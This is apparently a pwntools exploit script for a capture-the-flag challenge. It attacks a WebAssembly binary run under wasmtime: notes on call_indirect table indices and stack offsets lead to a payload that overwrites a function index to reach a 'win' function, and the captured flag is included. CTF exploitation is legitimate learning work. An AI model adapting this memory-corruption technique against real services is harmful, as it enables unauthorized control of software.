#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host 127.0.0.1 --port 4000

# dont forget to: patchelf --set-interpreter /tmp/ld-2.27.so ./test
# dont forget to set conext.arch. E.g amd64

from pwn import *

# Set up pwntools for the correct architecture
context.update(arch='amd64')
exe = '/home/h0ps/.wasmtime/bin/wasmtime'
context.terminal = ['tmux', 'new-window']
argv = ['bin.wasm']
env = {}

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or '127.0.0.1'
port = int(args.PORT or 4000)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

def typo(char):
    io.sendlineafter("joke!", str(1))
    io.sendlineafter("there?", char)

#math: 0x25 - <our input>
def do_math(num):
    io.sendlineafter("joke!", str(2))
    io.sendlineafter("number:", str(num))

def joke():
    io.sendlineafter("joke!", str(3))


# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
# pwndbg tele command
gdbscript = '''
break main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

# https://ctftime.org/writeup/34226

'''
uses wasi = web assembly system interface
    - allows standalone wasm programs to run headlessly,
    while giving them the ability to print to stdout
    , read stdin, and etc.

'''

'''
local.get 0
i32.const 17
call_indirect (type $int2int)

When call_indirect is called, it takes the function index in the table from the top of the value stack. That's why i32.const 17 comes immediately before the call.

static const wasm_elem_segment_expr_t elem_segment_exprs_w2c_e0[] = {
  {1, (wasm_rt_function_ptr_t)&w2c_basic, 0},
  {1, (wasm_rt_function_ptr_t)&w2c_win, 0},
  {0, (wasm_rt_function_ptr_t)&w2c_diff, 0},
  {3, (wasm_rt_function_ptr_t)&w2c___stdio_seek, 0},
  {2, (wasm_rt_function_ptr_t)&w2c___stdio_write, 0},
  {2, (wasm_rt_function_ptr_t)&w2c___stdio_read, 0},
  {0, (wasm_rt_function_ptr_t)&w2c___stdio_close, 0},
  {2, (wasm_rt_function_ptr_t)&w2c___stdout_write, 0},
};

static void init_memories(Z_bin_instance_t* instance) {
  wasm_rt_allocate_memory(&instance->w2c_memory, 2, 65536);
  LOAD_DATA(instance->w2c_memory, 1024u, data_segment_data_w2c__rodata, 3244);
  LOAD_DATA(instance->w2c_memory, 4272u, data_segment_data_w2c__data, 356);
}

i32_store
    - where to
    - offset where to
    - value

i32_load
    - from where
    - to where


  fix_typo: stack_pointer -0x20 + 0x10

  do_math: stack_pointer - 0x10 + 0xc
    0x25 - my_val

  get_name = stack_pointer - 0x10


  static void init_globals(Z_bin_instance_t* instance) {
  instance->w2c___stack_pointer = 72816u;

  win = stack - 0x80

  index for call= 0 = -0x80+0x7c = -0x4
}


call_indirect = 4th param

index = @

'''

'''
diff result stored at:
-50+0x2c = -6
'''


# diff func index: offset -4 (-0x14 from stack_pointer)
# joke func index: offset -12 (-0x1c from stack_pointer)

# name @ stack -0x10

io = start(argv, env=env)

payload = p8(0x42)*0x10
num = -12
bytes_32 = num.to_bytes(4, byteorder='little', signed=True)
payload += bytes_32

io.sendlineafter("name:", payload)


# stack -0x10 = fix_typo inp

# tries = -0x18

typo(str(2))

joke()

#do_math(2)


io.interactive()

# INS{L00k_mUm!W1th0ut_toUch1ng_RIP!}

